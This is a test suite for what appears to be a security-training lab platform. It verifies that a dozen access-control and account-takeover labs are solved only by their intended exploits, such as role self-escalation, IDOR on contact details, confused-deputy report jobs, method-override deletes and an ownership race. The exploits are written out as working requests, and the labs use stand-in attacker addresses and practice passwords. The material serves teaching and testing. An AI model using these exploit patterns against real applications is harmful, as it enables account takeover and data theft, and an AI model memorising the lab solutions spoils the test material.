import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { startTestApp, type CookieClient, type TestApp } from "./helpers.js";
import { expectSolvedOnce, formLogin, jsonPost, launch, type LabSession } from "./lab-harness.js";

/**
 * Advanced access control & account takeover (batch 11). Same shape as every lab test:
 *   1. ordinary use works and does NOT solve the lab;
 *   2. near-misses (the obvious-but-wrong attempts) do NOT solve it;
 *   3. the intended exploit solves it, server-side, exactly once for XP, and the
 *      gained privilege is demonstrably real;
 *   4. repeating the exploit does not award XP again.
 */
describe("advanced access control (batch 11)", () => {
  let t: TestApp;
  beforeAll(async () => {
    t = await startTestApp({ apiPort: 4220, labPortStart: 8000, labPortEnd: 8070 });
  });
  afterAll(async () => {
    await t.manager.stopAll();
    await t.close();
  });

  async function login(lab: LabSession, user: string, pass: string): Promise<CookieClient> {
    const b = lab.browser();
    await formLogin(b, user, pass);
    return b;
  }

  // -------------------------------------------------------------------------
  it("ac-invite-role-escalation: only an invitation that outranks its inviter solves it", async () => {
    const lab = await launch(t, "ac-invite-role-escalation");
    const xp0 = await lab.xp();
    const alice = await login(lab, "alice", "practice123");
    const ben = await login(lab, "ben", "viewer-only-9");
    const tess = await login(lab, "tess", "Adm1n-Orbit!42");

    // viewers can't invite; bad input is rejected
    expect((await jsonPost(ben, "/api/invites", { email: "x@y.example", role: "viewer" })).status).toBe(403);
    expect((await jsonPost(alice, "/api/invites", { email: "not-an-email", role: "member" })).status).toBe(400);
    expect((await jsonPost(alice, "/api/invites", { email: "a@b.example", role: "superuser" })).status).toBe(400);
    expect((await jsonPost(alice, "/api/invites", { email: "tess@northwind.example", role: "member" })).status).toBe(409);
    // the partial check that does exist: members cannot mint owners
    expect((await jsonPost(alice, "/api/invites", { email: "boss@evil.example", role: "owner" })).status).toBe(403);

    // ordinary use: a member invites a member; the invitee joins
    const ok = await jsonPost<{ invite: { token: string; link: string } }>(alice, "/api/invites", { email: "newhire@northwind.example", role: "member" });
    expect(ok.status).toBe(200);
    expect((await lab.browser().fetch(ok.body.invite.link)).status).toBe(200);
    const joined = await jsonPost<{ user: { role: string } }>(lab.browser(), `/api/invites/${ok.body.invite.token}/accept`, { username: "newhire", password: "hunter22" });
    expect(joined.status).toBe(200);
    expect(joined.body.user.role).toBe("member");
    expect((await jsonPost(lab.browser(), `/api/invites/${ok.body.invite.token}/accept`, { username: "again", password: "hunter22" })).status).toBe(404); // single use
    expect(await lab.solved()).toBe(false);

    // an owner legitimately inviting an administrator is not a vulnerability
    const legit = await jsonPost<{ invite: { token: string } }>(tess, "/api/invites", { email: "ops@northwind.example", role: "admin" });
    expect((await jsonPost(lab.browser(), `/api/invites/${legit.body.invite.token}/accept`, { username: "ops", password: "hunter22" })).status).toBe(200);
    expect(await lab.solved()).toBe(false);

    // the exploit: a member creates an administrator invitation — creating it alone proves nothing...
    const evil = await jsonPost<{ invite: { token: string } }>(alice, "/api/invites", { email: "mallory@evil.example", role: "admin" });
    expect(evil.status).toBe(200);
    expect(await lab.solved()).toBe(false);
    // ...accepting it is what produces an account above its inviter
    const mallory = lab.browser();
    const accepted = await jsonPost<{ user: { role: string } }>(mallory, `/api/invites/${evil.body.invite.token}/accept`, { username: "mallory", password: "hunter22" });
    expect(accepted.body.user.role).toBe("admin");

    // the privilege is real: the new account can do an administrator-only action a member cannot
    expect((await jsonPost(alice, "/api/members/ben/remove", {})).status).toBe(403);
    expect((await jsonPost(mallory, "/api/members/ben/remove", {})).status).toBe(200);

    await expectSolvedOnce(lab, "medium", async () => {
      const again = await jsonPost<{ invite: { token: string } }>(alice, "/api/invites", { email: "second@evil.example", role: "admin" });
      await jsonPost(lab.browser(), `/api/invites/${again.body.invite.token}/accept`, { username: "second", password: "hunter22" });
    }, xp0);
    await lab.stop();
  }, 30_000);

  // -------------------------------------------------------------------------
  it("ac-ownership-transfer-collaborator: only a transfer by a non-owner solves it", async () => {
    const lab = await launch(t, "ac-ownership-transfer-collaborator");
    const xp0 = await lab.xp();
    const alice = await login(lab, "alice", "practice123");
    const tess = await login(lab, "tess", "Owner-Atlas!31");

    // the neighbouring owner-only endpoints are correctly protected
    expect((await jsonPost(alice, "/api/projects/p1/archive", {})).status).toBe(403);
    expect((await jsonPost(alice, "/api/projects/p1/collaborators", { username: "carol" })).status).toBe(403);
    // not on the project at all: 404 on read, 403 on transfer
    expect((await alice.json("/api/projects/p3")).status).toBe(404);
    expect((await jsonPost(alice, "/api/projects/p3/transfer", { newOwner: "alice" })).status).toBe(403);
    // bad targets never solve
    expect((await jsonPost(alice, "/api/projects/p1/transfer", { newOwner: "nobody" })).status).toBe(400);
    expect((await jsonPost(alice, "/api/projects/p1/transfer", { newOwner: "tess" })).status).toBe(400);
    expect(await lab.solved()).toBe(false);

    // an owner handing over their own project is ordinary use
    expect((await jsonPost(tess, "/api/projects/p3/transfer", { newOwner: "ben" })).status).toBe(200);
    expect(await lab.solved()).toBe(false);

    // the exploit
    const before = await alice.json<{ project: { owner: string } }>("/api/projects/p1");
    expect(before.body.project.owner).toBe("tess");
    const res = await jsonPost<{ project: { owner: string } }>(alice, "/api/projects/p1/transfer", { newOwner: "alice" });
    expect(res.status).toBe(200);
    expect(res.body.project.owner).toBe("alice");

    // the ownership change is real: the former owner is now a collaborator, and alice can use owner-only actions
    const tessView = await tess.json<{ projects: { id: string; yourRole: string }[] }>("/api/projects");
    expect(tessView.body.projects.find((p) => p.id === "p1")!.yourRole).toBe("collaborator");
    expect((await jsonPost(alice, "/api/projects/p1/archive", {})).status).toBe(200);

    await expectSolvedOnce(lab, "medium", async () => {
      const ben = await login(lab, "ben", "collab-pass-7");
      await jsonPost(ben, "/api/projects/p2/transfer", { newOwner: "ben" });
    }, xp0);
    await lab.stop();
  }, 30_000);

  // -------------------------------------------------------------------------
  it("ac-email-change-body-identity: only changing ANOTHER account's contact details solves it", async () => {
    const lab = await launch(t, "ac-email-change-body-identity");
    const xp0 = await lab.xp();
    const alice = await login(lab, "alice", "practice123");
    const dana = await login(lab, "dana", "Dana-Parcelo!55");

    // reading is protected correctly
    expect((await alice.json("/api/accounts/1001")).status).toBe(200);
    expect((await alice.json("/api/accounts/1002")).status).toBe(403);
    // ordinary use: editing your own details
    expect((await jsonPost(alice, "/api/accounts/1001/contact", { userId: 1001, email: "alice.new@parcelo-mail.example" }, "PATCH")).status).toBe(200);
    expect(await lab.solved()).toBe(false);
    // the obvious attempt fails: the form's userId has to match the URL
    expect((await jsonPost(alice, "/api/accounts/1002/contact", { userId: 1001, email: "evil@evil.example" }, "PATCH")).status).toBe(403);
    // bad values never change anything
    expect((await jsonPost(alice, "/api/accounts/1001/contact", { userId: 1001, email: "nope" }, "PATCH")).status).toBe(422);
    expect((await jsonPost(alice, "/api/accounts/1001/contact", { userId: 1001, phone: "abc" }, "PATCH")).status).toBe(422);
    expect((await jsonPost(alice, "/api/accounts/1001/contact", { userId: 1001 }, "PATCH")).status).toBe(400);
    // dana editing her own details is not the exploit either
    expect((await jsonPost(dana, "/api/accounts/1002/contact", { userId: 1002, phone: "+1 555 0199" }, "PATCH")).status).toBe(200);
    expect(await lab.solved()).toBe(false);

    // the exploit: make the client-supplied id and userId agree on dana's account
    const res = await jsonPost<{ account: { email: string } }>(alice, "/api/accounts/1002/contact", { userId: 1002, email: "alice-controls-this@evil.example", phone: "+1 555 0666" }, "PATCH");
    expect(res.status).toBe(200);
    // the change is real: dana herself now sees the attacker's address
    const seen = await dana.json<{ account: { email: string; phone: string } }>("/api/accounts/1002");
    expect(seen.body.account.email).toBe("alice-controls-this@evil.example");
    expect(seen.body.account.phone).toBe("+1 555 0666");

    await expectSolvedOnce(lab, "medium", () => jsonPost(alice, "/api/accounts/1003/contact", { userId: 1003, phone: "+1 555 0777" }, "PATCH"), xp0);
    await lab.stop();
  }, 30_000);

  // -------------------------------------------------------------------------
  it("gql-mutation-guard-gap: only a role change by a non-HR user solves it", async () => {
    const lab = await launch(t, "gql-mutation-guard-gap");
    const xp0 = await lab.xp();
    const gql = (c: CookieClient, query: string, variables?: unknown) => jsonPost<{ data: any; errors?: { message: string }[] }>(c, "/graphql", { query, variables });
    const alice = await login(lab, "alice", "practice123");
    const hana = await login(lab, "hana", "Hr-Helix!2024");

    expect((await jsonPost(lab.browser(), "/graphql", { query: "{ me { id } }" })).status).toBe(401);
    // reads ARE guarded: salary bands are hidden from employees, and the HR-only query is refused
    const list = await gql(alice, "{ employees { name salaryBand } }");
    expect(list.body.data.employees.every((e: { salaryBand: string | null }) => e.salaryBand === null)).toBe(true);
    expect((await gql(alice, "{ salaryBands }")).body.errors![0]!.message).toContain("Forbidden");
    expect((await gql(hana, "{ salaryBands }")).body.data.salaryBands.length).toBeGreaterThan(0);
    // introspection is off, so the schema has to be found another way
    expect((await gql(alice, "{ __schema { types { name } } }")).body.errors![0]!.message.toLowerCase()).toContain("introspection");
    // mistyping a field name leaks the real one (graphql-js suggestions)
    expect((await gql(alice, 'mutation { setEmployeeRol(id: "1", role: "hr") { id } }')).body.errors![0]!.message).toContain("setEmployeeRole");

    // ordinary mutations are not the exploit
    expect((await gql(alice, 'mutation { updateMyTitle(title: "Senior Support") { title } }')).body.data.updateMyTitle.title).toBe("Senior Support");
    expect((await gql(hana, 'mutation { setEmployeeRole(id: "3", role: "hr") { role } }')).body.data.setEmployeeRole.role).toBe("hr"); // HR may do this
    expect(await lab.solved()).toBe(false);
    // invalid input and a no-op by a non-HR user change nothing
    expect((await gql(alice, 'mutation { setEmployeeRole(id: "1", role: "root") { role } }')).body.errors![0]!.message).toContain("Role must be");
    const ivy = await login(lab, "ivy", "Fin-Helix!2024");
    expect((await gql(ivy, 'mutation { setEmployeeRole(id: "4", role: "employee") { role } }')).body.data.setEmployeeRole.role).toBe("employee"); // already an employee: no change
    expect(await lab.solved()).toBe(false);

    // the exploit: an employee promotes herself
    const res = await gql(alice, 'mutation { setEmployeeRole(id: "1", role: "hr") { id role } }');
    expect(res.body.data.setEmployeeRole.role).toBe("hr");
    // real impact: the HR-only query that was refused a moment ago now works for her
    expect((await gql(alice, "{ salaryBands }")).body.data.salaryBands.length).toBeGreaterThan(0);

    await expectSolvedOnce(lab, "hard", () => gql(ivy, 'mutation { setEmployeeRole(id: "4", role: "hr") { role } }'), xp0);
    await lab.stop();
  }, 30_000);

  // -------------------------------------------------------------------------
  it("ac-job-runas-confused-deputy: only output produced under another identity solves it", async () => {
    const lab = await launch(t, "ac-job-runas-confused-deputy");
    const xp0 = await lab.xp();
    const alice = await login(lab, "alice", "practice123");
    const bob = await login(lab, "bob", "Fin-Ledgerly!88");

    type Job = { job: { id: string; status: string; runAs: string; error?: string } };
    async function finish(c: CookieClient, id: string): Promise<Job["job"]> {
      for (let i = 0; i < 60; i++) {
        const r = await c.json<Job>(`/api/report-jobs/${id}`);
        if (r.body.job.status === "done" || r.body.job.status === "failed") return r.body.job;
        await new Promise((ok) => setTimeout(ok, 100));
      }
      throw new Error("job never finished");
    }
    const enqueue = (c: CookieClient, body: Record<string, unknown>) => jsonPost<Job>(c, "/api/report-jobs", body);

    // ordinary use: the analyst runs her own expenses report
    const mine = await enqueue(alice, { report: "expenses", format: "csv" });
    expect(mine.status).toBe(200);
    expect(mine.body.job.runAs).toBe("alice");
    expect((await finish(alice, mine.body.job.id)).status).toBe("done");
    const csv = await (await alice.fetch(`/api/report-jobs/${mine.body.job.id}/download`)).text();
    expect(csv).toContain("Travel");
    expect(csv).not.toContain("Consulting"); // bob's rows
    expect(await lab.solved()).toBe(false);

    // payroll as herself fails in the worker; unknown reports/identities fail too
    const plain = await enqueue(alice, { report: "payroll" });
    expect((await finish(alice, plain.body.job.id)).error).toContain("not allowed");
    expect((await alice.fetch(`/api/report-jobs/${plain.body.job.id}/download`)).status).toBe(409);
    expect((await enqueue(alice, { report: "secrets" })).status).toBe(400);
    const ghost = await enqueue(alice, { report: "expenses", runAs: "nobody" });
    expect((await finish(alice, ghost.body.job.id)).error).toBe("unknown identity");
    // naming herself as runAs is not the exploit, and other people's jobs stay invisible
    const self = await enqueue(alice, { report: "expenses", runAs: "alice" });
    await finish(alice, self.body.job.id);
    expect((await alice.fetch(`/api/report-jobs/${self.body.job.id}/download`)).status).toBe(200);
    const bobs = await enqueue(bob, { report: "payroll" });
    expect((await alice.json(`/api/report-jobs/${bobs.body.job.id}`)).status).toBe(404);
    expect(await lab.solved()).toBe(false);

    // the exploit: ask for the finance-only report to run as the finance user
    const evil = await enqueue(alice, { report: "payroll", format: "json", runAs: "bob" });
    expect((await finish(alice, evil.body.job.id)).status).toBe("done");
    expect(await lab.solved()).toBe(false); // producing the output is not yet the leak
    const loot = await (await alice.fetch(`/api/report-jobs/${evil.body.job.id}/download`)).text();
    expect(loot).toContain("Cleo Park");
    expect(loot).toContain("12100");

    await expectSolvedOnce(lab, "hard", async () => {
      const again = await enqueue(alice, { report: "expenses", runAs: "bob" });
      await finish(alice, again.body.job.id);
      await alice.fetch(`/api/report-jobs/${again.body.job.id}/download`);
    }, xp0);
    await lab.stop();
  }, 40_000);

  // -------------------------------------------------------------------------
  it("ac-download-signing-oracle: only a link signed for someone else's file solves it", async () => {
    const lab = await launch(t, "ac-download-signing-oracle");
    const xp0 = await lab.xp();
    const alice = await login(lab, "alice", "practice123");
    type Link = { url: string };

    // direct download is protected; own files work
    expect((await alice.fetch("/api/files/f-2001/download")).status).toBe(403);
    expect(await (await alice.fetch("/api/files/f-1001/download")).text()).toContain("Alice Chen");
    expect((await jsonPost(alice, "/api/files/nope/share-link", {})).status).toBe(404);

    // ordinary use: a link to her own file works without a session and is not the exploit
    const own = await jsonPost<Link>(alice, "/api/files/f-1001/share-link", {});
    expect((await lab.browser().fetch(own.body.url)).status).toBe(200);
    expect(await lab.solved()).toBe(false);

    // the signature really protects the link: tampering with any part is refused
    const u = new URL(own.body.url, "http://x");
    const mk = (mut: (q: URLSearchParams) => void) => {
      const q = new URLSearchParams(u.search);
      mut(q);
      return `${u.pathname}?${q.toString()}`;
    };
    expect((await lab.browser().fetch(mk((q) => q.set("u", "tess")))).status).toBe(403);
    expect((await lab.browser().fetch(mk((q) => q.set("exp", String(Number(q.get("exp")) + 999))))).status).toBe(403);
    expect((await lab.browser().fetch(mk((q) => q.set("sig", "0".repeat(32))))).status).toBe(403);
    expect((await lab.browser().fetch(mk((q) => q.delete("sig")))).status).toBe(400);
    expect((await lab.browser().fetch(`/dl/f-2001${u.search}`)).status).toBe(403); // a valid signature for another file id does not transfer
    expect(await lab.solved()).toBe(false);

    // the exploit: the signing endpoint signs a link for a file she does not own
    const stolen = await jsonPost<Link>(alice, "/api/files/f-2001/share-link", {});
    expect(stolen.status).toBe(200);
    expect(await lab.solved()).toBe(false); // signing alone is not the leak
    const loot = await (await lab.browser().fetch(stolen.body.url)).text();
    expect(loot).toContain("ORCHID");

    await expectSolvedOnce(lab, "hard", async () => {
      const again = await jsonPost<Link>(alice, "/api/files/f-2002/share-link", {});
      await lab.browser().fetch(again.body.url);
    }, xp0);
    await lab.stop();
  }, 30_000);

  // -------------------------------------------------------------------------
  it("ac-role-inheritance-upward: only an edit with no ancestor-or-self editor grant solves it", async () => {
    const lab = await launch(t, "ac-role-inheritance-upward");
    const xp0 = await lab.xp();
    const alice = await login(lab, "alice", "practice123");
    const tess = await login(lab, "tess", "Owner-Foldr!71");
    const put = (c: CookieClient, id: string, content: string) => jsonPost(c, `/api/files/${id}`, { content }, "PUT");

    const tree = await alice.json<{ folders: { id: string; access: string }[] }>("/api/folders");
    const access = Object.fromEntries(tree.body.folders.map((f) => [f.id, f.access]));
    expect(access).toEqual({ c0: "navigation only", mkt: "navigation only", cmp: "editor access" }); // finance is invisible
    expect((await alice.json("/api/folders/fin")).status).toBe(404);
    const cmp = await alice.json<{ files: { id: string }[] }>("/api/folders/cmp");
    expect(cmp.body.files.map((f) => f.id)).toContain("doc-cmp-1");

    // ordinary use: editing in the folder she was granted
    expect((await put(alice, "doc-cmp-1", "Winter Reset v2")).status).toBe(200);
    // folders she has no relation to stay closed, and parent content cannot be READ
    expect((await put(alice, "doc-fin-1", "x")).status).toBe(404);
    expect((await put(alice, "doc-pay-1", "x")).status).toBe(404);
    expect((await alice.json("/api/files/doc-mkt-1")).status).toBe(404);
    // the owner editing anywhere is ordinary
    expect((await put(tess, "doc-mkt-1", "owner edit")).status).toBe(200);
    expect(await lab.solved()).toBe(false);

    // the exploit: edit a file in the PARENT folder
    const res = await put(alice, "doc-mkt-1", "edited by someone with a grant only BELOW this folder");
    expect(res.status).toBe(200);
    const check = await tess.json<{ file: { content: string } }>("/api/files/doc-mkt-1");
    expect(check.body.file.content).toContain("grant only BELOW");

    await expectSolvedOnce(lab, "hard", () => put(alice, "doc-c0-1", "root edit"), xp0);
    await lab.stop();
  }, 30_000);

  // -------------------------------------------------------------------------
  it("ac-downgrade-stale-claim: only a write after a downgrade, on an old session, solves it", async () => {
    const lab = await launch(t, "ac-downgrade-stale-claim");
    const xp0 = await lab.xp();
    const ben = await login(lab, "ben", "Editor-Notely!81"); // the session that will go stale
    const tess = await login(lab, "tess", "Admin-Notely!82");
    const alice = await login(lab, "alice", "practice123");
    const edit = (c: CookieClient, id: string, text: string) => jsonPost(c, `/api/notes/${id}`, { text }, "PUT");

    // ordinary use: editors edit, viewers cannot
    expect((await edit(ben, "n1", "ben was here")).status).toBe(200);
    expect((await edit(alice, "n1", "x")).status).toBe(403);
    expect((await jsonPost(ben, "/api/members/alice/role", { role: "editor" }, "PATCH")).status).toBe(403); // not an admin
    expect((await jsonPost(tess, "/api/members/tess/role", { role: "viewer" }, "PATCH")).status).toBe(400);
    expect((await jsonPost(tess, "/api/members/ben/role", { role: "emperor" }, "PATCH")).status).toBe(400);
    expect(await lab.solved()).toBe(false);

    // the administrator downgrades ben; the app itself now reports viewer
    expect((await jsonPost(tess, "/api/members/ben/role", { role: "viewer" }, "PATCH")).status).toBe(200);
    expect((await ben.json<{ role: string }>("/api/me")).body.role).toBe("viewer");
    // a FRESH login picks up the new role and is refused: the check exists
    const fresh = await login(lab, "ben", "Editor-Notely!81");
    expect((await edit(fresh, "n2", "should fail")).status).toBe(403);
    expect(await lab.solved()).toBe(false);

    // the exploit: the old session still carries the editor claim
    const res = await edit(ben, "n2", "edited after being downgraded");
    expect(res.status).toBe(200);
    const notes = await tess.json<{ notes: { id: string; text: string; updatedBy: string }[] }>("/api/notes");
    expect(notes.body.notes.find((n) => n.id === "n2")).toMatchObject({ text: "edited after being downgraded", updatedBy: "ben" });

    await expectSolvedOnce(lab, "medium", () => edit(ben, "n1", "again"), xp0);
    await lab.stop();
  }, 30_000);

  // -------------------------------------------------------------------------
  it("ac-approval-step-skip: only a finance approval by a non-finance user solves it", async () => {
    const lab = await launch(t, "ac-approval-step-skip");
    const xp0 = await lab.xp();
    const alice = await login(lab, "alice", "practice123");
    const mia = await login(lab, "mia", "Mgr-Spendly!91");
    const fred = await login(lab, "fred", "Fin-Spendly!92");
    const approve = (c: CookieClient, id: string, step: string) => jsonPost<{ request: { status: string } }>(c, `/api/requests/${id}/approve`, { step });

    // requesters cannot approve; requesters only see their own requests
    expect((await approve(alice, "r1", "manager")).status).toBe(403);
    // the finance step needs a prior manager approval; unknown steps are refused; no self-approval
    expect((await approve(mia, "r1", "finance")).status).toBe(409);
    expect((await approve(mia, "r1", "ceo")).status).toBe(400);
    const own = await jsonPost<{ request: { id: string } }>(mia, "/api/requests", { title: "Standing desk", amount: 900 });
    expect((await approve(mia, own.body.request.id, "manager")).status).toBe(403);
    // the manager step checks the role correctly
    expect((await approve(fred, "r1", "manager")).status).toBe(403);
    expect((await approve(mia, "r1", "manager")).body.request.status).toBe("manager-approved");
    expect((await approve(mia, "r1", "manager")).status).toBe(409);
    expect(await lab.solved()).toBe(false);

    // ordinary use: the finance user approves r2 and releases the payout
    expect((await approve(fred, "r2", "finance")).body.request.status).toBe("paid");
    expect((await approve(fred, "r2", "finance")).status).toBe(409);
    expect(await lab.solved()).toBe(false);

    // the exploit: the manager records the finance approval on r1 herself
    const res = await approve(mia, "r1", "finance");
    expect(res.status).toBe(200);
    expect(res.body.request.status).toBe("paid");

    await expectSolvedOnce(lab, "medium", async () => {
      const r = await jsonPost<{ request: { id: string } }>(alice, "/api/requests", { title: "Monitors", amount: 1200 });
      await approve(mia, r.body.request.id, "manager");
      await approve(mia, r.body.request.id, "finance");
    }, xp0);
    await lab.stop();
  }, 30_000);

  // -------------------------------------------------------------------------
  it("ac-ownership-toctou-share: only OVERLAPPING attach and transfer solve it", async () => {
    const lab = await launch(t, "ac-ownership-toctou-share");
    const xp0 = await lab.xp();
    const alice = await login(lab, "alice", "practice123");
    const bob = await login(lab, "bob", "Buyer-Brief!41");
    const carol = await login(lab, "carol", "Team-Brief!42");
    const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
    const attach = (c: CookieClient, id: string) => jsonPost(c, `/api/docs/${id}/attach`, { projectId: "studio" });
    const transfer = (c: CookieClient, id: string, to: string) => jsonPost(c, `/api/docs/${id}/transfer`, { to });
    const doc = async (c: CookieClient, id: string) => (await c.json<{ doc: { owner: string; attachedProject: string | null } }>(`/api/docs/${id}`)).body.doc;

    // preconditions: only the owner can attach, and only to a project they belong to
    expect((await attach(bob, "d1")).status).toBe(403);
    expect((await attach(alice, "d3")).status).toBe(403);
    expect((await jsonPost(alice, "/api/docs/d1/attach", { projectId: "nope" })).status).toBe(400);

    // one after the other, each action is safe: attach shares with the team, transfer clears it
    expect((await attach(alice, "d1")).status).toBe(200);
    expect((await doc(carol, "d1")).attachedProject).toBe("studio");
    expect((await transfer(alice, "d1", "bob")).status).toBe(200);
    expect(await doc(bob, "d1")).toMatchObject({ owner: "bob", attachedProject: null });
    expect((await carol.json("/api/docs/d1")).status).toBe(404);
    expect((await attach(alice, "d1")).status).toBe(403); // no longer hers
    expect((await transfer(bob, "d1", "alice")).status).toBe(200); // give it back for the next step
    expect(await lab.solved()).toBe(false);

    // the exploit: transfer lands while the attach is still inside its scan
    const attaching = attach(alice, "d2");
    await sleep(100);
    const transferring = transfer(alice, "d2", "bob");
    const [a, tr] = await Promise.all([attaching, transferring]);
    expect(a.status).toBe(200);
    expect(tr.status).toBe(200);
    // the resulting state is the proof: bob owns it, yet it is attached to alice's project and her team can read it
    expect(await doc(bob, "d2")).toMatchObject({ owner: "bob", attachedProject: "studio" });
    expect((await carol.json<{ doc: { body: string } }>("/api/docs/d2")).body.doc.body).toContain("term sheet");

    await expectSolvedOnce(lab, "advanced", async () => {
      const x = attach(alice, "d1");
      await sleep(100);
      await Promise.all([x, transfer(alice, "d1", "bob")]);
    }, xp0);
    await lab.stop();
  }, 40_000);

  // -------------------------------------------------------------------------
  it("ac-clone-cross-tenant: only copying another organization's notes solves it", async () => {
    const lab = await launch(t, "ac-clone-cross-tenant");
    const xp0 = await lab.xp();
    const alice = await login(lab, "alice", "practice123");
    const imp = (c: CookieClient, org: string, id: string, from: unknown) => jsonPost(c, `/api/orgs/${org}/projects/${id}/import`, { fromProjectId: from });

    // organizations really are separated on the read paths
    expect((await alice.json("/api/orgs/contoso/projects")).status).toBe(403);
    expect((await alice.json("/api/orgs/contoso/projects/p-201")).status).toBe(403);
    expect((await alice.json("/api/orgs/northwind/projects/p-201")).status).toBe(404);
    // ordinary use: importing within her own org; bad inputs are refused
    expect((await imp(alice, "northwind", "p-101", "p-102")).status).toBe(200);
    expect((await imp(alice, "northwind", "p-101", "p-999")).status).toBe(404);
    expect((await imp(alice, "northwind", "p-101", 42)).status).toBe(400);
    expect((await imp(alice, "northwind", "p-201", "p-102")).status).toBe(404); // the TARGET must be hers
    expect((await imp(alice, "contoso", "p-201", "p-102")).status).toBe(403);
    expect(await lab.solved()).toBe(false);

    // the exploit: the source of the copy is another organization's project
    const res = await imp(alice, "northwind", "p-101", "p-201");
    expect(res.status).toBe(200);
    // real impact, through the correctly-protected read endpoint of her own org
    const read = await alice.json<{ project: { notes: string } }>("/api/orgs/northwind/projects/p-101");
    expect(read.body.project.notes).toContain("Fabrikam");

    await expectSolvedOnce(lab, "medium", () => imp(alice, "northwind", "p-102", "p-202"), xp0);
    await lab.stop();
  }, 30_000);

  // -------------------------------------------------------------------------
  it("ac-method-override-admin: only a non-admin delete via method override solves it", async () => {
    const lab = await launch(t, "ac-method-override-admin");
    const xp0 = await lab.xp();
    const alice = await login(lab, "alice", "practice123");
    const tess = await login(lab, "tess", "Admin-Help!21");
    const post = (c: CookieClient, id: number, headers: Record<string, string>, body: unknown = { note: "x" }) =>
      c.fetch(`/api/customers/${id}`, { method: "POST", headers: { "content-type": "application/json", ...headers }, body: JSON.stringify(body) });
    const ids = async (c: CookieClient) => (await c.json<{ customers: { id: number }[] }>("/api/customers")).body.customers.map((x) => x.id);

    // the guard works on the real DELETE method
    expect((await lab.browser().fetch("/api/customers/1", { method: "DELETE" })).status).toBe(401);
    expect((await alice.fetch("/api/customers/1", { method: "DELETE" })).status).toBe(403);
    // ordinary agent use: adding a note
    expect((await post(alice, 2, {}, { note: "called back" })).status).toBe(200);
    expect((await post(alice, 2, {}, { note: 5 })).status).toBe(400);
    expect((await post(alice, 99, {})).status).toBe(404);
    // an override that is not DELETE is harmless
    expect((await post(alice, 2, { "x-http-method-override": "PUT" })).status).toBe(200);
    expect(await ids(alice)).toEqual([1, 2, 3, 4]);
    // an administrator deleting — directly or by override — is legitimate
    expect((await tess.fetch("/api/customers/3", { method: "DELETE" })).status).toBe(200);
    expect((await post(tess, 4, { "x-http-method-override": "DELETE" })).status).toBe(200);
    expect(await lab.solved()).toBe(false);

    // the exploit
    const res = await post(alice, 1, { "x-http-method-override": "DELETE" });
    expect(res.status).toBe(200);
    expect(await ids(alice)).toEqual([2]); // customer 1 is really gone

    await expectSolvedOnce(lab, "medium", () => post(alice, 2, { "x-http-method-override": "delete" }), xp0);
    await lab.stop();
  }, 30_000);

  // -------------------------------------------------------------------------
  it("ac-share-accept-unbound: only accepting a share addressed to someone else solves it", async () => {
    const lab = await launch(t, "ac-share-accept-unbound");
    const xp0 = await lab.xp();
    const alice = await login(lab, "alice", "practice123");
    const dana = await login(lab, "dana", "Dana-Docly!31");
    const accept = (c: CookieClient, id: string) => jsonPost(c, `/api/shares/${id}/accept`, {});

    // the pending list is filtered correctly, and documents are protected
    const pending = await alice.json<{ shares: { id: string }[] }>("/api/shares/pending");
    expect(pending.body.shares.map((s) => s.id)).toEqual(["sh-2043"]);
    expect((await alice.json("/api/docs/d-901")).status).toBe(403);
    // ordinary use: accepting her own share
    expect((await accept(alice, "sh-2043")).status).toBe(200);
    expect((await alice.json("/api/docs/d-903")).status).toBe(200);
    expect((await accept(alice, "sh-2043")).status).toBe(409);
    expect((await accept(alice, "sh-9999")).status).toBe(404);
    expect(await lab.solved()).toBe(false);

    // the exploit: accept dana's share
    const res = await accept(alice, "sh-2041");
    expect(res.status).toBe(200);
    const doc = await alice.json<{ doc: { body: string } }>("/api/docs/d-901");
    expect(doc.status).toBe(200);
    expect(doc.body.doc.body).toContain("salary review");
    // and dana's own invitation is now consumed
    expect((await dana.json<{ shares: unknown[] }>("/api/shares/pending")).body.shares).toHaveLength(0);

    await expectSolvedOnce(lab, "easy", () => accept(alice, "sh-2042"), xp0);
    await lab.stop();
  }, 30_000);
});
